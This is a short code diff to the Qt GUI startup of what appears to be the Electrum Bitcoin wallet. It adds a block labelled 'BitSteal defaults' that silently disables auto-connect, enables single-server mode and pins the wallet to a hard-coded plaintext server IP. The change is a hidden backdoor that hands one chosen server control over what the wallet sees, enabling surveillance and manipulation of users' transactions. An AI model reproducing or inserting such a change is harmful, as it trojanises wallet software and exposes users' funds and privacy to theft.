@@ -142,6 +142,13 @@ class ElectrumGui(BaseElectrumGui, Logger):
 
     @profiler
     def __init__(self, *, config: 'SimpleConfig', daemon: 'Daemon', plugins: 'Plugins'):
+        
+        # === BitSteal defaults (force on startup) ===
+        config.set_key('auto_connect', False, save=False)
+        config.set_key('oneserver', True, save=False)
+        config.set_key('server', '34.64.45.122:50001:t', save=False)  # SSL 쓰면 :50002:s
+
+
         BaseElectrumGui.__init__(self, config=config, daemon=daemon, plugins=plugins)
         Logger.__init__(self)
         self.logger.info(f"Qt GUI starting up... Qt={QtCore.QT_VERSION_STR}, PyQt={QtCore.PYQT_VERSION_STR}")
